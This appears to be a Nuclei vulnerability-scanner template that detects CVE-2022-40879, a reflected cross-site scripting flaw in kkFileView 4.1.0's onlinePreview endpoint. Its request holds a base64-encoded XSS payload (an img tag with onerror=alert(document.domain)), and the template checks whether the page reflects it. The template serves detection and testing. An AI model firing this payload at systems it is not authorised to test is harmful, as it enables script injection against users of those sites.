id: CVE-2022-40879

info:
  name: kkFileView - Cross Site Scripting (XSS) via the parameter 'errorMsg'
  author: theamanrawat
  severity: medium
  description: kkFileView v4.1.0 is vulnerable to Cross Site Scripting (XSS) via the parameter 'errorMsg'.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40879
    - https://github.com/kekingcn/kkFileView/issues/389
  tags: cve2022,xss,kkfileview

requests:
  - method: GET
    path:
      - "{{BaseURL}}/onlinePreview?url=aHR0cHM6Ly93d3cuYmFpZHUuPGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik%2b"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - https://www.baidu.<img src=1 onerror=alert(document.domain)>

      - type: status
        status:
          - 200